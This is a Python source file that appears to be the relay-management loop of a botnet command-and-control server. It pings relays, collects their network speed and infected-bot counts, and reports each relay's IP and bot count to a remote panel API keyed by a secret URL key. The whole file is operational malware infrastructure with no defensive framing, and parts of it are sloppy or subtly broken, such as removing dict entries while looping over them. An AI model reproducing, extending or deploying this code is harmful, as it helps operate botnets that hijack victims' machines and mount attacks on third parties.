from time import sleep
from socket import socket as Sock
from requests import get as rget
from .config import C2Config

class Loops():
    def __init__(
        self,
        config: C2Config = C2Config(),
    ):
        self.config = config

    def relay_api(
        self,
        data: dict,
        act: bool,
    ) -> bool:
        ip: str = data['ip']
        bots = data['bots']

        url=f"{self.config.API_URL}/relays.php?urlkey={self.config.URL_KEY}&ip={ip}&bots={bots}&act={act}"

        try:
            res: str = rget(url, timeout=5000).json()
            return res == "ok"

        except Exception as e:
            print(f"error \n{url}\n{e}\n\n")
            return False

    def send(
        self,
        socket: Sock,
        data: str,
        escape: bool = True,
        reset: bool = True,
    ) -> None:
        if reset: data += self.config.COLOR_RESET
        if escape: data += '\r\n'

        socket.send(data.encode())

    def _ping(self) -> None:
        for relay in self.config.relay_list.keys():
            try:
                relay.settimeout(3)
                self.send(relay, 'RPING', False, False)
                if relay.recv(1024).decode() != f'RPONG[p:{self.config.relay_list}]':
                    self.config.relay_list.pop(relay)
                    relay.close()

            except Exception: 
                self.config.relay_list.pop(relay)
                relay.close()

    def ping(self) -> None:
        while 1:
            self._ping()
            sleep(self.config.cnc_time.PING)

    def _net(self) -> None:
        self.config.speed.clear()

        for relay in self.config.relay_list.keys():
            print(relay)
            try:
                relay.settimeout(3)

                self.send(relay, 'RNETSPEED', False, False)
                data: str = relay.recv(1024).decode()
                print(data)

                try:
                    if not data:
                        print('not')
                        self.config.relay_list.pop(relay)
                        relay.close()
                        continue

                    self.config.speed.append(int(data))
                    print('ok')

                except Exception:
                    self.config.relay_list.pop(relay)
                    relay.close()

            except Exception:
                print("except")
                self.config.relay_list.pop(relay)
                relay.close()

    def net(self) -> None:
        while 1:
            self._net()
            sleep(self.config.cnc_time.NET)


    def _getbot(self) -> None:
        self.config.bots.clear()
        self.config.temp_relay_bots.clear()

        for relay in self.config.relay_list.keys():
            try:
                relay.settimeout(3)
                self.send(relay, 'RNETBOTS', False, False)
                data: str = relay.recv(1024).decode()

                print(data)

                try:
                    self.config.temp_relay_bots.append(
                        {'ip': relay.getpeername()[0], 'bots': int(data)}
                    )
                except Exception as e: print(e)

                try:
                    if not data:
                        print('not')
                        self.config.relay_list.pop(relay)
                        relay.close()
                        continue

                    self.config.bots.append(int(data))

                except Exception:
                    self.config.relay_list.pop(relay)
                    relay.close()

            except Exception as e:
                print(f"except getbot\n\n{e}\n\n")
                self.config.relay_list.pop(relay)
                relay.close()

        self.config.relay_bots.clear()
        for i in self.config.temp_relay_bots:
            self.config.relay_bots.append(i)
            
            # idk what is this for
            if self.relay_api(i, False): print('ok')
            else: print("relay_api error")

    def getbot(self) -> None:
        while 1:
            self._getbot()
            sleep(self.config.cnc_time.GETBOT)
